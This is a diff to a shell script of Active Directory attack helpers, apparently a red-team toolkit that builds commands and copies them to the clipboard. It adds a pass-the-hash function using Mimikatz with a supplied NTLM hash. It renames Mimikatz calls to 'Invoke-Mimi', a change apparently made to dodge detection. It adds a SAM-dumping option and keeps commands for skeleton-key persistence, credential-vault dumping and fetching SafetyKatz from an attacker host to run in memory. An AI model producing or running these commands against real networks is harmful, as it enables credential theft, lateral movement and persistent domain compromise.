@@ -26,7 +26,8 @@ nb-ad-pwsh-dump-secrets        dump secrets on windows machine using Invoke-Mimi
 
 Domain Privilege Escalation
 ---------------------------
-nb-ad-pwsh-opth                execute over-pass-the-hash with Rubeus
+nb-ad-pwsh-opth                execute over-pass-the-hash with Rubeus.exe
+nb-ad-pwsh-pth                 execute pass-the-hash with Invoke-Mimi.ps1
 nb-ad-pwsh-ptt                 execute pass-the-ticket with Rubeus
 nb-ad-pwsh-dcsync              execute DCSync attack with SafetyKatz for krbtgt user
 nb-ad-pwsh-kerberoasting       kerberoasting
@@ -48,7 +49,6 @@ nb-ad-pwsh-persist-golden      create a golden ticket
 nb-ad-pwsh-persist-silver      create a silver ticket
 nb-ad-pwsh-persist-diamond     create a diamond ticket
 nb-ad-pwsh-persist-skeleton    create a skeleton key (not opsec safe nor recommended)
-nb-ad-pwsh-persist-dsrm        persistence through DSRM
 
 Misc
 ----
@@ -60,12 +60,17 @@ DOC
 }
 
 nb-ad-pwsh-persist-skeleton() {
+    __warn "Load Invoke-Mimi with:"
+    __ok ". .\\Invoke-Mimi.ps1"
+    __ok "nb-pwsh-file-download    - Execute in memory"
+    echo
+
     __ask "Enter the current Domain name"
     nb-vars-set-domain
     __ask "Enter the target DC hostname"
     local hostname && __askvar hostname HOSTNAME
 
-    __COMMAND="Invoke-Mimikatz -Command '\"privilege::debug\" \"misc::skeleton\"' -ComputerName $hostname.${__DOMAIN}"
+    __COMMAND="Invoke-Mimi -Command '\"privilege::debug\" \"misc::skeleton\"' -ComputerName $hostname.${__DOMAIN}"
 
     echo "$__COMMAND" | wl-copy
     echo
@@ -514,6 +519,26 @@ nb-ad-pwsh-dcsync() {
     __ok "$__COMMAND"
 }
 
+nb-ad-pwsh-pth() {
+    __warn "Load Invoke-Mimi with:"
+    __ok ". .\\Invoke-Mimi.ps1"
+    __ok "nb-pwsh-file-download    - Execute in memory"
+    echo
+
+    __ask "Enter the target machine hostname"
+    local hostname && __askvar hostname HOSTNAME
+    nb-vars-set-user
+    __ask "Enter the user's NTLM Hash"
+    __check-hash
+
+    __COMMAND="Invoke-Mimi -Command '\"sekurlsa::pth /domain:$hostname /user:${__USER} /ntlm:${__HASH} /run:powershell.exe\"'"
+
+    echo "$__COMMAND" | wl-copy
+    echo
+    __info "Command copied to clipboard:"
+    __ok "$__COMMAND"
+}
+
 nb-ad-pwsh-opth() {
     __check-project
     nb-vars-set-domain
@@ -690,8 +715,9 @@ nb-ad-pwsh-dump-secrets() {
     __ask "Choose a command to copy:"
     echo "1. Invoke-Mimi -Command '\"sekurlsa::ekeys\"'"
     echo "2. Invoke-Mimi -Command '\"token::elevate\" \"vault::cred /patch\"'"
-    echo "3. C:\\\\AD\\\\Tools\\\\Loader.exe -Path C:\\\\AD\\\\Tools\\\\SafetyKatz.exe -args \"%Pwn%\" \"exit\""
-    echo "4. .\\\\Loader.exe -Path http://<LHOST>:<LPORT>/SafetyKatz.exe -args \"%Pwn%\" \"exit\""
+    echo "3. Invoke-Mimi -Command '\"token::elevate\" \"lsadump::sam\"'"
+    echo "4. C:\\\\AD\\\\Tools\\\\Loader.exe -Path C:\\\\AD\\\\Tools\\\\SafetyKatz.exe -args \"%Pwn%\" \"exit\""
+    echo "5. .\\\\Loader.exe -Path http://<LHOST>:<LPORT>/SafetyKatz.exe -args \"%Pwn%\" \"exit\""
     echo
     echo -n "Choice: "
     read choice
@@ -699,14 +725,15 @@ nb-ad-pwsh-dump-secrets() {
     case $choice in
         1) __COMMAND="Invoke-Mimi -Command '\"sekurlsa::ekeys\"'";;
         2) __COMMAND="Invoke-Mimi -Command '\"token::elevate\" \"vault::cred /patch\"'";;
-        3) __COMMAND="C:\\\\AD\\\\Tools\\\\Loader.exe -Path C:\\\\AD\\\\Tools\\\\SafetyKatz.exe -args \"%Pwn%\" \"exit\"";;
-        4) 
+        3) __COMMAND="Invoke-Mimi -Command '\"token::elevate\" \"lsadump::sam\"'";;
+        4) __COMMAND="C:\\\\AD\\\\Tools\\\\Loader.exe -Path C:\\\\AD\\\\Tools\\\\SafetyKatz.exe -args \"%Pwn%\" \"exit\"";;
+        5) 
           __ask "For porproxy to localhost use 127.0.0.1"
           nb-vars-set-lhost
           nb-vars-set-lport
           __COMMAND=".\\\\Loader.exe -Path http://${__LHOST}:${__LPORT}/SafetyKatz.exe -args \"%Pwn%\" \"exit\""
           ;;
-        5) exit;;
+        6) exit;;
         *) echo "Invalid option"; exit;;
     esac
 
